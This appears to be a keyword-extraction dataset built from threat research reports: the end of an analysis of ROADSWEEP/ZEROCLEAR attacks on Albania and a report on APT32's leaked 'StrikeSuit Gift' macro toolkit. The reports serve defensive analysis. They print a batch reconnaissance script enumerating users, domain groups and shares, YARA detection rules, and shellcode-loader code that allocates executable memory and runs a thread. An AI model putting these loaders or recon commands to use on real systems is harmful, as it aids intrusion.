LOGICALDISK get /value @echo {{WMIC_CDROM}}>>%t% @wmic /failfast:on /append:%t% CDROM get /value @echo {{WMIC_PRINTERCONFIG}}>>%t% @wmic /failfast:on /append:%t% PRINTERCONFIG get /value @echo {{WMIC_USERACCOUNT}}>>%t% @wmic /failfast:on /append:%t% USERACCOUNT get /value @echo {{WMIC_SHARE}}>>%t% @wmic /failfast:on /append:%t% SHARE get /value @echo {{WMIC_STARTUP}}>>%t% @wmic /failfast:on /append:%t% STARTUP get /value @echo {{WMIC_PROCESS}}>>%t% @wmic /failfast:on /append:%t% PROCESS get /value @echo {{WMIC_SERVICE}}>>%t% @wmic /failfast:on /append:%t% SERVICE get /value @echo {{WMIC_SYSDRIVER}}>>%t%16/22@wmic /failfast:on /append:%t% SYSDRIVER get /value @echo {{WMIC_PAGEFILE}}>>%t% @wmic /failfast:on /append:%t% PAGEFILE get /value @echo {{WMIC_PAGEFILE}}>>%t% @wmic /failfast:on /append:%t% PAGEFILE get /value @echo {{SYSTEMINFO}}>>%t% @echo {{Reg_Uninstall}}>>%t% @REG QUERY ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"" /s>>%t% @echo {{Reg_TerminalServerClient}}>>%t% @REG QUERY ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"" /s>>%t% @echo {{BOOTCFG}}>>%t% @echo {{IPCONFIG/All}}>>%t% @IPCONFIG /ALL>>%t% @echo {{whoami}}>>%t% @echo {{net user /domain}}>>%t% @net user /domain>>%t% @echo {{net user}}>>%t% @net user>>%t% @echo {{net user Administrator}}>>%t% @net user Administrator>>%t% @echo {{net localgroup administrators}}>>%t% @net localgroup administrators>>%t% @echo {{net group /domain }}>>%t% @net group /domain>>%t% @echo {{net group ""domain admins"" /domain}}>>%t% @net group ""domain admins"" /domain>>%t% @echo {{net view}}>>%t% @net view>>%t% @echo {{net use}}>>%t% @net use>>%t% @echo {{net share}}>>%t% @net share>>%t% @echo {{route print}}>>%t% @route print>>%t% @echo {{net localgroup}}>>%t% @net localgroup>>%t% @echo {{net group ""Exchange Trusted Subsystem"" /domain}}>>%t% @net group ""Exchange Trusted Subsystem"" /domain>>%t% @echo {{net accounts /domain}}>>%t% @net accounts /domain>>%t% @echo {{net accounts}}>>%t% @net accounts>>%t% @echo {{netstat -an}}>>%t% @netstat -an>>%t% @echo {{set}}>>%t% @echo {{tasklist}}>>%t% @tasklist>>%t%17/22@echo {{dir c:\ }}>>%t% @dir c:\ >>%t% @echo {{dir d:\ }}>>%t% @dir d:\ >>%t% @echo {{dir e:\ }}>>%t% @dir e:\ >>%t% @echo {{dir f:\}}>>%t% @dir f:\>>%t% @echo {{dir g:\}}>>%t% @dir g:\>>%t% @echo {{dir Desktop}}>>%t% @dir %appdata%\ \ \Desktop>>%t% @echo {{dir C:\Users}}>>%t% @dir C:\Users>>%t% @echo {{dir ""C:\Program Files""}}>>%t% @dir ""C:\Program Files"">>%t% @echo {{dir ""C:\Program Files (x86)""}}>>%t% @dir ""C:\Program Files (x86)"">>%t% @echo {{dir C:\ProgramData}}>>%t% @dir C:\ProgramData>>%t% @echo {{ping gitlab.com}}>>%t% @ping gitlab.com>>%t% @echo {{ping mail.google.com}}>>%t% @ping mail.google.com>>%t% @echo {{ping google.com}}>>%t% @ping google.com>>%t% @echo {{ping mf.local}}>>%t% @ping mf.local>>%t% @echo {{DATE-TIME}}>>%t% @date /T>>%t% @time /T>>%t% @echo {{END}}>>%t% @del /q /f %f% @more<%t%>%f% @del /q /f %t% @exit MITRE ATT&CK TechniquesID T1070.004 File DeletionTechnique System Service Discovery Query Registry Obfuscated Files or Information System Owner/User Discovery Process Injection Process Discovery18/22System Information Discovery File and Directory Discovery Access Token Manipulation Service StopT1070.006 Timestomp T1497.001 System Checks T1518 T1543.003 Windows Service T1569.002 Service Execution Yara RulesSoftware Discoveryrule M_Disrupt_ROADSWEEP_1{meta:author = ""Mandiant""description = ""Identifies the encryption key used within ROADSWEEP""strings:$ = {C6 45 D5 E4 C6 45 D6 B1 C6 45 D7 6B C6 45 D8 22 C6 45 D9 B5 C6 45 DA 88 C6 45 DB 94 C6 45 DC AA C6 45 DD 86 C6 45 DE C4 C6 45 DF 21 C6 45 E0 E8 C6 45 E1 75 C6 45 E2 9D C6 45 E3 F3 C7 44 24 10 00 00 00 F0}condition:all of them}rule M_Disrupt_ZEROCLEAR_1 {meta:author = ""Mandiant""description = ""Identifies code sequences in ZEROCLEAR""19/22strings:$ = ""B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D"" wide$ = ""wp starts!""$ = ""un start!""$ = ""in start!""condition:all of them}rule M_Backdoor_CHIMNEYSWEEP_1{meta:author = ""Mandiant""description = ""Detects strings found in CHIMNEYSWEEP""strings:$ = ""%sAPPX.%x%x%x%x%x.tmp""$ = ""rerunadmn""$ = ""runupdate""$ = ""runupdateok""$ = ""baserun""$ = ""heyirunadmn""$ = ""subttoadmn""20/22$ = ""ttrundll""$ = ""{\""ok\"":false,""$ = ""TL_%s-%s""$ = ""|**|Net1NOFILE|**|""$ = ""%s:---:%s-%s:---:%s:---:www:---:MNEW""condition:uint16(0) == 0x5A4D and 8 of them}import ""pe""rule M_Backdoor_CHIMNEYSWEEP_2{meta:author = ""Mandiant""description = ""Detects encrypted data found in CHIMNEYSWEEP""strings:$key = {C6 45 D5 E4 C6 45 D6 B1 C6 45 D7 6B C6 45 D8 22 C6 45 D9 B5 C6 45 DA 88 C6 45 DB 94 C6 45 DC AA C6 45 DD 86 C6 45 DE C4 C6 45 DF 21 C6 45 E0 E8 C6 45 E1 75 C6 45 E2 9D C6 45 E3 F3 C7 44 24 10 00 00 00 F0}$encoded_config = {FA c0 c7 e5}$encoded_bot = {AE E0 ED D6}condition:21/22uint16(0) == 0x5A4D and all of them and (pe.exports(""RatingSetupUI"") or pe.exports(""A""))}22/22 ","{'phrases': ['ransomware', 'ROADSWEEP', 'use', 'Albanian government organizations', 'data', 'documents', 'disruptive activity', 'Albanian government websites', 'execution', 'HomeLand Justice', 'front', 'ZEROCLEAR wiper', 'links', 'Iranian', 'evidence'], 'target': 'ransomware; ROADSWEEP; use; Albanian government organizations; data; documents; disruptive activity; Albanian government websites; execution; HomeLand Justice; front; ZEROCLEAR wiper; links; Iranian; evidence.'}"
the attacker; VB macros; the StrikeSuit gift; the macro; the malware; the victim; use; the system; processes; macros; screenshots; IP address; attribution; the path; the shellcode; commands; its environment; data; the attacker; the malware; commands; the C2; data; infections; the victim; a denial; APT32; the source code; time; the attack.,"[' 1. APT32 sends spear phishing emails with weaponized Office document attachments. 2. The documents contain VB macros created using the StrikeSuit Gift toolkit. 3. When victims enable macros, the malware executes. 4. Macros use PowerShell scripts and scheduled tasks to download additional payloads. 5. Payloads inject shellcode into other processes using techniques like process hollowing. 6. Shellcode decrypts and executes final backdoor or RAT payloads. 7. Backdoors communicate with command servers to exfiltrate data. 8. StrikeSuit Gift macros collect system info, record audio/video, log keystrokes, etc. 9. Obfuscation routines in StrikeSuit Gift hide strings and API calls. 10. Macros use randomized strings and fake words to blend in and evade detection. ']","Extract the keywords: The origin story of APT32 macros: The StrikeSuit Gi  that keeps giving Threat research reportSteve Miller, Sr. Threat Researcher Silas Cutler, Principal Reverse Engineer27/04/22The origin story of APT32 macros THREAT RESEARCH REPORTTable of contentsPrologueChapter IThe StrikeSuit Gift that keeps giving Summarizing the sourceChapter IIA tale of three GUIs A song as old as rhyme: Office VBA macrosChapter IIILooking the gift horse in the mouth How did the RAR get made? Unboxed source code projects at a glance What’s the deal with all this shellcode? The one from ShellcodeLoader.vb The one from test.doc The one from RawShellcode The typical VB macro contentChapter IVStrikeSuit malware development conventions Documenting antivirus and compatibility testing Feature testing, housekeeping, and fingerprintsCleaning up the development mess with _Cleanup.bat Visual Studio Solution User Options (.suo) analysisDevelopment in progressTesting features and functions46 35204/2022The origin story of APT32 macros THREAT RESEARCH REPORTBackup structure Macro comparisons Borrowed and repurposed open-source codeChapter VStockpiling the unique toolmarks and indicatorsUsernames, handles, and hostnames Distinct macro timestamps from a scheduled task XML file Testing the export of scheduled tasks XML Developer fingerprints in scheduled task XML Network-based indicators PDB pathsThreadwork of attribution and assessing connections to APT32ShellcodeLoader L.dll APT32 then and nowEpilogueAppendixYARA rules VTI queries “Indicators”Links and referencesAPT32 by year Office macros Visual Studio 202235 73304/2022The origin story of APT32 macros THREAT RESEARCH REPORTPrologue“The Gifts of an Enemy are Justly to be Dreaded” Voltaire404/2022The origin story of APT32 macros THREAT RESEARCH REPORTEveryone loves an origin story.When the world learns of new malware and attacks, we are often left pondering the motivations, mulling over the attribution, and sifting through the nitty-gritty bits and bytes to understand the TTPs and tradecraft. Why wasit done, who was behind it, and how did they do it?Analysts, researchers, and investigators of all sorts spend time plotting the dots, drawing connections between data points, helping the evidence speak, and passing judgment on areas of uncertainty. When we dive deep into malware and attacks, we often are left interpreting nuanced artifacts to help us get a glimpse into the original malware development environment. We look to debug information and PDB paths to make inferences about the developer workstations. We look to the Rich header metadata to help understand the specifics of the linker, compiler, and architecture of the original development machine. We examine specific malicious functions within a piece of malware to identify code reuse. We identify notable libraries to tease out pieces of software that may be borrowed from public projects around the internet. Part of the fun of analysis is the challenge of the puzzle and the relentless pursuit of insight in the face of complex, limited, or opaque data. Yet, sometimes we get lucky, and we stumble on a piece of malware source code to get a more intimate look at the malware author, a clearer window into the original development environment, and a naked look at the malware itself. This origin story is for all you Visual Basic macro fans out there. In this report, we unearth a demon from the ancient world: a mysterious malware source code package called StrikeSuit Gift. We examine this source code package in detail and dive deep into development conventions, tradecraft, toolmarks, and potential connections to the threat actor APT32.504/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter I604/2022The origin story of APT32 macros THREAT RESEARCH REPORTThe StrikeSuit Gift that keeps giving Our thirst for knowledge leads us back in time to the foregone world of 2017. The year was a dystopia of its own, yet it was the golden age of APT32. The prolific Vietnam-based threat actor was running wild, targeting foreign governments, dissidents, journalists, and pretty much any private corporation trying to do business in Vietnam. APT32, also known by “OceanLotus'' and “BISMUTH,” is famous for innovating and bypassing defenses using a combination of custom-developed, open-source, and commercially available tooling to perform intrusion activities. Like many threat actors, APT32 favors phishing via lure documents laden with malicious macros to execute or download a piece of malware. Through following the breadcrumbs of historical macro content, we stumbled across an archive submitted to VirusTotal in late 2017. This archive contains a litany of malware source code, shellcode, test files, documents, macros, notes, and more, all of which could span nearly a decade of malware development. This malware source package is internally named StrikeSuit Gift. Though it appears to be developed years ago, dissecting this malware may give us insights into the practices used by malware developers today. Furthermore, through inspection of the minutiae, we may establish links to support the gut notion that this source code package was developed or used by APT32.Summarizing the source Occasionally, malware developers will inadvertently leak source code packages by triggering antivirus or endpoint detection products. Once the security vendor has a copy of the malware file, it may be shared or otherwise proliferated around the globe through data-sharing partnerships, backchannel exchanges, and product integrations. Eventually, all roads lead to Rome. The StrikeSuit Gift source package was submitted to VirusTotal at 2017-08-26 07:29:19 UTC. The StrikeSuit Gift package is a 2.99MB RAR archive containing over 200 files, most of which are Visual Studio solutions or source code in a couple of programming languages. This package also includes test documents, text files, built executables, and a couple of other RAR and ZIP files. There’s a lot of data here and multiple timelines to look at. To help illustrate this package at a high level, here’s a look at the directory tree three levels deep with parentheses to show the last modified timestamp, according to WinRAR. These timestamps are squirrely and imperfect, but they suggest a THREAT RESEARCH REPORT├── AVs-Test (2017-08-25 03:10) │ └── Result.txt ├── Office-Versions (2017-08-25 21:32) │ └── Verions.txt ├── ReadMe.txt (2017-08-10 01:25) │ │ ├── Macros_Builder (2017-08-24 01:21) │ │ ├── Macros_Builder.sln │ │ ├── Macros_Builder.v11.suo │ │ └── _Cleanup.bat (2013-10-29 00:18) │ ├── Macros_Builder_1.0.zip │ │ └── Macros_Builder (2016-04-19 05:32) │ ├── RawShellcode (2017-08-23 00:24) │ ├── WebBuilder │ │ ├── HtaDotNet (2017-08-24 01:21) │ │ └── ShellcodeLoader (2017-08-18 04:50) │ └── WebBuilder.rar │ │ └── WebBuilder (2011-09-23 20:30) │ │ ├── HtaDotNet (2011-09-23 20:30) │ │ └── ShellcodeLoader (2011-09-23 20:30) └── Source├── CSharp (2017-08-23 21:30) │ ├── MacrosEmbedding (2017-08-18 00:18) │ ├── MacrosEmbeddingExample (2017-08-13 19:52) │ └── VbaCodeCreator (2017-08-23 21:30) ├── C_Cpp (2017-08-23 03:45) │ ├── Binary (2017-08-24 01:21) │ └── ShellcodeThreadCaller (2017-08-24 01:21) └── VB (2017-08-20 21:23) ├── ShellcodeLoader (2017-08-20 21:23) └── XmlScriptAnalyst (2017-08-16 20:17)At first glance, we can see that in August 2017 this project was in active development. It seems that the malware author may have brought in older projects and files from years past. These files may have been archives of their own and are kept in the directory structure for reference or in the event the developer needs to pull the ripcord and recover the original, older code. Macros_Builder was from 2016 and got new updates in August 2017. HtaDotNet and ShellcodeLoader are older, maybe as far back as 2011, but were both touched in August 2017. A cleanup batch script may have been created or used as far back as 2013 but was copied over to help delete extraneous development artifacts. We will dive into more details further down the page, but we804/2022The origin story of APT32 macros THREAT RESEARCH REPORTthink the superficial totality of these timestamps shows a developer who is leaning on old code, making improvements, performing tests, and enhancing a small set of interconnected malware tools.904/2022The origin story of APT32 macros THREAT RESEARCH REPORTChapter II1004/2022The origin story of APT32 macros THREAT RESEARCH REPORTA tale of three GUIs Within the delicate web of source code lie three juicy GUIs for us to behold. We begin with the oldest and jump further back in time to October 2013, when a malware developer compiled a debug build of Office Macros Builder - Version 1.0.0 at 2013-10-08 16:00:51. This GUI tool is to help a legion of intrusion operators inject macros into Office documents.GUIs for hacking tools and malware kits exist to help intrusion operators perform complex tasks quickly, easily, repeatedly, and reliably. GUIs help scale out capabilities across a workforce of varying roles, skills, and experience levels. Once you can make it an easy button, almost anyone can smash it to unleash their evils. The Office Macros Builder - Version 1.0.0 above accepts an Office file (.doc) and a macros (.vb or .txt) and uses Microsoft.Office.Interop.Word and Microsoft.Vbe.Interop assemblies to jam the macro into the document. The program takes the document and creates an alternate data stream  ADS  with a Zone Identifier of 0 to indicate that it is from “URLZONE_LOCAL_MACHINE,” the most trusted zone.1104/2022The origin story of APT32 macros THREAT RESEARCH REPORTTime marches on, and we fast forward to spring 2016. Somewhere around the world, the development team behind StrikeSuit Gift starts their morning with coffee and pastries and compiles the GUI program Embed Office Macros at 2016-03-11 09:02:13.We jump ahead to 2017 when the threat actor is outed by Mandiant. The bosses demand an upgrade from their malware development team. Now, the malware developer Rachael is suddenly tasked to enhance an older codebase to make it a bit more versatile for intrusion operations. Rachael begins with some slight modifications to the older macro text, add_schedule_vba.txt, makes some enhancements to the GUI, and then compiles the new version of Embed Office Macros at 8/17/2017 08:18:44.1204/2022The origin story of APT32 macros THREAT RESEARCH REPORTWhile looking at the pretty pictures may not give us foresight into the future of this malware toolkit, the visual progression of these GUIs is important because this is where the many malware functionalities bear fruit. These GUIs represent the final vehicles for mass malware operations and will be used to create hundreds, if not thousands, of malicious macros for Office documents.A song as old as rhyme: Office VBA macros Let’s take a quick break from the timeline and recap the ever-loathed scourge of the infosec world: Microsoft Office macros.1304/2022The origin story of APT32 macros THREAT RESEARCH REPORTVisual Basic  VB , Visual Basic Scripts  VBS , and Visual Basic for Applications  VBA  are basically the same programming language, except that VBA is designed to run within a Microsoft Office application such as Word, Excel, PowerPoint, etc. In the context of malware and phishing documents, we often just refer to any VB scripting content as “macros.” Every IT administrator and business person will tell you that macros have a legitimate purpose and are integral to crucial company processes. The supposed legitimate purpose is exactly why malicious macros are so effective in phishing campaigns. Macros are so common in cross-company, cross-business processes that many users are easily coerced into executing even the malicious ones. Attackers know this and act accordingly. If you’re new to VB macros or maybe want a quick refresher, we recommend these great reads to recap what macros are and examples of how they may show up in phishing or lure documents:● url ● url ● url ● url origin story of APT32 macros THREAT RESEARCH REPORTChapter III1504/2022The origin story of APT32 macros THREAT RESEARCH REPORTNow, we’ll jump to late August 2017 when someone on the malware development or operation team makes a crucial mistake. Rachael or one of their counterparts transfers the RAR archive of StrikeSuit Gift to a machine with antivirus software running. The embedded shellcode and macro content inside of the RAR trigger an AV signature, and the archive file is hoovered up and blasted across the internet. Those monitoring recent submissions to VirusTotal would see an alert for the YARA rule “APT32_ActiveMime_Lure” and arrive at the RAR archive for StrikeSuit Gift.Looking the gift horse in the mouth It's tough to analyze this much malware source code line by line, so let’s do our best to summarize the high points and tease out juicy deets that may be interesting to our understanding of the actor’s capabilities, the development tradecraft, and then we can connect what we’re seeing here to attacks out in the world.How did the RAR get made? We do not have many clues to describe how the main RAR file was created; however, we can take an educated guess that it was created with WinRAR 4.x for the folder on the mounted volume D:\P17028 - StrikeSuit Gift - Office Macro Type 1. each of the archived files and directories with a four-byte “mtime” timestamp, likely representing the NTFS last modified time from Windows. If we open this RAR file with WinRAR, the utility identifies this as RAR 4.x archive. According to the documentation, the RAR 4.x format stores the last modified timestamps in local time rather than UTC. This is not important as we’re skeptical about timestamps to begin with but good to know that in older versions of WinRAR, we should see a four-byte combo of MS DOS TIME and DATE local timestamps. In modern versions of WinRAR, the default is “high-precision” eight-byte uint64 Windows FILETIME UTC timestamps; however, if we deselect the high-precision flag, the timestamp becomes a four-byte uint32 Unix time_t. Isn’t forensics fun? These three examples were created based on the original StrikeSuit Gift RAR file, looking at the RAR last modified timestamp for \Office-Versions\Verions.txt. We took this file and re-archived it using a modern WinRAR both with and without the high-precision flag, and the time there reflects a  5 adjustment for the UTC offset on our test system. We can convert any of these raw timestamps back to a human time to see the approximate modification time.1604/2022The origin story of APT32 macros THREAT RESEARCH REPORTExamples of three possible archive timestamps made by WinRAR of different versions.Last Modified HexTime TypeHuman TimeWinRAR84 B1 19 4BMS DOS TIME   DATE8/25/2017 22 12 08*52 DB FE 19 19 1E D3 01Windows FILETIME8/26/2017 03 12 0808 E7 A0 59Unix time_t8/26/2017 03 12 084.x5.0 5.0 *Nuanced: We can try doing it based on this approach, or we can try this (easier?  manual approach with the endian swap binary output in CyberChef. To sum all of that up, we can guess based on the age of the StrikeSuit Gift RAR file that this was created with an old 4.x version of WinRAR, and we can confirm that with the structure of the archive headers and the format of the now deprecated DOS-style timestamps. Ok, let’s power forward to the good stuff.Unboxed source code projects at a glance To help us get a broad vision of all the source code in our StrikeSuit Gift package, we take a high-level look at the main projects.Parent Directory:P17028 - StrikeSuit Gift - Office Macro Type 1ProjectSummaryMacros_BuilderMacros_Builder.sln   Visual Studio 2012This GUI program “Embed Office Macros” was created in 2016 and modernized in August 2017.The main program defines macro file add_schedule_vba.txt as a resource, then the main routine takes that macro and replaces variables from things in GUI and writes out to MacrosSource.txt. The program has a separate functionality to take a GUI selected file and use Trinet.Core.IO.Ntfs to write an Alternate Data Stream  ADS  Zone Identifier to 2.1704/2022The origin story of APT32 macros THREAT RESEARCH REPORTWebBuilder/ HtaDotNetHtaDotnet.sln   Visual Studio 2012This solution has several components. The first is the HtaDotnet project which appears to have UI components and serves as a framework to embed shellcode and file data into an HTA document with either VB script or JavaScript. This has two resource objects DotNet4Ldr and DotNetLdr which appear to be serialized versions of L.dll (see ShellcodeLoader, below).The Test project uses HtaDotnet to manually build an HTA file based on hard-coded paths for shellcode, a file, and a file name.byte[] shellcode = File.ReadAllBytes(@""c:\temp\shl.bin""); byte[] embedFileData = File.ReadAllBytes(@""c:\temp\bintext.exe""); string embedFileName = ""().exe""; … HtaDotNetBuilder builder = new HtaDotNetBuilder(); byte[] hta = builder.BuildHtaDotnetLdr(engine, embedFileData);File.WriteAllBytes(@""c:\temp\11.hta"", hta);WebBuilder/ ShellcodeLoaderL.sln   Visual Studio 14, 14.0.25420.1 (was migrated, see UpgradeLog.htm)This solution is a set of functions that help with decoding, decrypting, and running shellcode, including that which may be in a text in a .HTA or .VBS file.The L class is designed to take some script content and decode or decrypt it into shellcode and execute it.The Test piece uses the L class and takes an input shellcode file, an input loader file (“L.dll”), two VB loader resources, and outputs into a text file.string inputShellcodeFile = @""G:\WebBuilder\Gift_HtaDotNet\_Temp\shl.bin"";1804/2022The origin story of APT32 macros THREAT RESEARCH REPORTstring inputLdrFile = @""G:\WebBuilder\Gift_HtaDotNet\ShellcodeLoader\L\bin\release\l.dl l""; string outputFile = @""c:\temp\l.txt""; string vbsLdrCompatFile = @""c:\temp\DotNetLdr""; string vbsLdrCompatFileDotNet4 = @""c:\temp\DotNet4Ldr"";CSharp/ MacrosEmbeddingMacrosEmbedding.sln   Visual Studio 14, 14.0.25420.1This GUI program “Office Macros Builder” was created in 2013. It checks GUI for inputs of an Office (.doc) and a macro file (.vb or .txt) and attempts to embed macro into a file (with some basic error handling) and tries to adjust ADS zone identifiers to 0.CSharp/ MacrosEmbeddingExampleMacrosEmbeddingExample.sln   Visual Studio 14, 14.0.25420.1This is likely a precursor or run alongside MacrosEmbedding to test macros embedding functionality. It creates a simple VB macro text, has an embedMacro function to embed a macro into a doc, and the main function takes hard-coded paths from the developer system and runs it.string pathDoc = @""C:\Users\Rachael\Desktop\MacrosTest.doc"";We see the function embedMacros from this expanded upon in both other CSharp/ solutions: MacrosEmbedding, and VbaCodeCreator.CSharp/ VbaCodeCreatorVbaCodeCreator.sln   Visual Studio 14, 14.0.25420.1This Visual Studio project is used to generate VB macros that can be bundled into documents. The main program takes two hard-coded paths, one for shellcode and one for an Office document, then runs the core to build the shellcode into it.string strShellcodePath = @""D:\P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\RawShellcode\2017-08-23 02-55-49 string strOfficeFilePath = @""C:\Users\Rachael\Desktop\test.doc""; Core.Core.startBuilder(strShellcodePath, strOfficeFilePath);1904/2022The origin story of APT32 macros THREAT RESEARCH REPORTAlong with this project in the debug directory, we keep a copy of test.doc and a handful of legitimate Microsoft Office binaries to support the functionalities.Test.doc has a Module1.bas VBA code stream that uses an old public VB script template but then has a function for shellcode as an array. The shellcode in the existing test.doc is a test file similar, if not identical, to the “RawShellcode” BinaryBinary.sln   Visual Studio 2012This reads in a shellcode blob, converts the binary to text, and writes to an output .dat file.int main(int argc, char **argv) {std::string strFilePath = ""D:\\P17028 - StrikeSuit Gift -Office Macro Type 1\\Reference\\RawShellcode\\2017-08-23 02-55-49 data = Binary::ReadBinaryFile(strFilePath);Binary::ConvertBinaryToText(""C:\\Users\\Rachael\\Desktop\\shellco de.dat"", data);C_Cpp/ ShellcodeThreadCallerShellcodeThreadCaller.sln   Visual Studio 2012This reads in shellcode from a hard-coded path and executes it.HANDLE hFile = CreateFileA(""C:\\Users\\Rachael\\Desktop\\2017-08-23 02-55-49 FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); LPVOID lpShellcodeAddr = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpShellcodeAddr, NULL, 0, NULL); WaitForSingleObject(hThread, INFINITE);VB/ ShellcodeLoaderShellcodeLoader.sln   Visual Studio 2012This is a different ShellcodeLoader than the L.dll one in WebBuilder.2004/2022The origin story of APT32 macros THREAT RESEARCH REPORTIn this solution, the main ShellcodeLoader.vb routine uses the Metasploit VB generated template (à la scriptjunkie), comments out the Meterpreter-esque shellcode array, and instead reads the local test shellcode blob as the main variable.Hyeyhafxp = My.Computer.FileSystem.ReadAllBytes(""./2017-08-23 XmlScriptAnalystXmlScriptAnalyst.sln   Visual Studio 2012This appears to be a test project to test VB code against the local system and builds an XML scheduled task based on VB functions. When run, it grabs the local system computer and user name, then writes this into an XML string, which is then written out to a hard-coded path XmlStr.txt. This relates to the XML functionality brought into an updated version of Macros_Builder.What’s the deal with all this shellcode? Interwoven through the StrikeSuit Gift package, amidst the varying projects, solutions, and macros, are a handful of shellcode blobs. Are they malware? What are they? Why are they here? Let’s find out.The one from ShellcodeLoader.vb File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\Source\VB\ShellcodeLoader\ShellcodeLoader\ShellcodeLoader.vb File Size: 195b This array is the default shellcode blob originally seen in ShellcodeLoader.vb, though it is commented out.'Hyeyhafxp = {232, 137, 0, 0, 0, 96, 137, 229, 49, 210, 100, 139, 82, 48, 139, 82, 12, 139, 82, 20, _ '139, 114, 40, 15, 183, 74, 38, 49, 255, 49, 192, 172, 60, 97, 124, 2, 44, 32, 193, 207, _ '13, 1, 199, 226, 240, 82, 87, 139, 82, 16, 139, 66, 60, 1, 208, 139, 64, 120, 133, 192, _ '116, 74, 1, 208, 80, 139, 72, 24, 139, 88, 32, 1, 211, 227, 60, 73, 139, 52, 139, 1, _2104/2022The origin story of APT32 macros THREAT RESEARCH REPORT'214, 49, 255, 49, 192, 172, 193, 207, 13, 1, 199, 56, 224, 117, 244, 3, 125, 248, 59, 125, _ '36, 117, 226, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, _ '139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 88, 95, 90, 139, 18, _ '235, 134, 93, 106, 1, 141, 133, 185, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, _ '224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, _ '187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 99, 97, 108, 99, 0}With some fiddling we can take this array and, by using Cyberchef, perform a From Decimal and dump snippet of shellcode up with the tool scdbg, we see that it probably is just a placeholder that uses WinExec to open passed arguments. That makes sense because (through Googling around the strings) we can see that this shellcode is borrowed verbatim from several open source code projects surrounding Metasploit VB macros, like this blog post by @scriptjunkie in 2012. It was later tweaked, forked, and copied into a variety of other macros and forms around the internet.The one from test.doc File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\Source\CSharp\VbaCodeCreator\VbaCodeCreator\bin\Debug\test.doc Size of Document: 1.13 MB (1182720 bytes) Size of Module1  405757 This is a big document. We know from the context that this will likely have macro content. So, we open it up using oledump to look at the internal streams. We can see several chunks of macro content, many of which will need to be parsed out for us to read it more clearly.oledump test.doc1: 114 '\x01CompObj' 2: 4096 '\x05DocumentSummaryInformation' 3: 4096 '\x05SummaryInformation' 4: 7265 '1Table' 5: 460 'Macros/PROJECT' 6: 95 'Macros/PROJECTwm' 7: M 682475 'Macros/VBA/Module1' 8: m 459686 'Macros/VBA/NewMacros'2204/2022The origin story of APT32 macros THREAT RESEARCH REPORT9: m 948 'Macros/VBA/ThisDocument' 10: 4190 'Macros/VBA/_VBA_PROJECT' 11: 623 'Macros/VBA/dir' 12: 4096 'WordDocument'The embedded macro is easy to carve out, thanks to Didier Steven’s outstanding oledump tool. When we extract Module1, we see the VB script with functions that itemize out a two-dimensional array that is later re-assembled and executed from 30 shellcode functions and nearly 1500 sub-arrays. After we extracted and converted the arrays, we ended up with a shellcode buffer. When the shellcode is executed, we get a pop-up box that tells us DllMain has been executed successfully! Huzzah.The one from RawShellcode File Path: P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\RawShellcode\ File size 72.99 KB (74740 bytes) We spelunked through all the source code and saw many references to what we believe is this file. This piece of shellcode, hereafter referred to as “the blob,” is cited in ShellcodeThreadCaller/Main.cpp2304/2022The origin story of APT32 macros THREAT RESEARCH REPORTunder the path C:\\Users\\Rachael\\Desktop\\2017-08-23 02-55-49 In VbaCodeCreator/Program.cs the blob is referenced under the path D:\P17028 - StrikeSuit Gift - Office Macro Type 1\Reference\RawShellcode\2017-08-23 02-55-49 This blob is also referenced in P17028 - StrikeSuit Gift - Office Macro Type 1/Source/C_Cpp/Binary/Binary/Main.cpp, which parses this file and converts each byte into an integer value. The converted file is saved to ""C:\\Users\\Rachael\\Desktop\\shellcode.dat"". And in VB/ShellcodeLoader/ShellcodeLoader.vb, the default shellcode array from the Metasploit post is commented out, and instead, blob is to be read in as Hyeyhafxp = My.Computer.FileSystem.ReadAllBytes(""./2017-08-23 02-55-49 With a name so specific, and having also located a file by this name within the overall package, we are probably safe in assuming that the references within the source are indeed the file with MD5 assumption that this developer is using this blob for testing and trying to make sure that this piece of shellcode works within all of their tooling. But what is this blob, exactly? Let’s find out. Looking at the blob alone, we can see that it does not have a sort of standard file header. Starting at offset 0x00C0, there are parts of a Windows PE header, which is always a good indication that we may be looking at an executable file wrapped in a shellcode loader.000000a0: aa7a a105 78fb 0bf9 5a45 df5a 7fe1 d104 .z x ZE.Z 000000b0: 75f7 5aed 08e2 fbf8 94f8 ae87 0e1f ba0e u.Z 000000c0: 00b4 09cd 21b8 014c cd21 5468 6973 2070 ! L.!This p 000000d0: 726f 6772 616d 2063 616e 6e6f 7420 6265 rogram cannot be 000000e0: 2072 756e 2069 6e20 444f 5320 6d6f 6465 run in DOS mode 000000f0: 2e0d 0d0a 2400 0000 0000 0000 4073 b402 $ @s 00000100: 0412 da51 0412 da51 0412 da51 1f8f 4451 Q Q Q DQWhen we load this up in a disassembler like IDA Pro, the first four bytes at the start of the file are converted to a call instruction. A subsequent call leads to a function at offset 0xF684, which is responsible for decoding the remaining payload of the blob.2404/2022The origin story of APT32 macros THREAT RESEARCH REPORTAs we started reverse engineering this shellcode function to understand how the payload is deployed at a granular level, we identified a 2019 blog post from Qi Anxin about this group's HTA downloaders. They had analyzed a version of this shellcode loader, and our findings were consistent. However, unlike their findings, our shellcode did not deploy a remote access tool, but presented us with a message box saying, “DllMain has been executed successfully!”. At this point, we see that the blob payload is a generic executable created to test their loaders without risking self-infection or making callouts to live C2 infrastructure. While this seems obvious and sensible, there are several assessments we can make from this knowledge. The first is their development capabilities are not the same as those conducting the attacks. This is also supported by the aforenoted use of GUIs, which can easily be used by less technical operators conducting attacks. Furthermore, the development team is sharp enough not to test their kit using actual offensive tooling, reducing 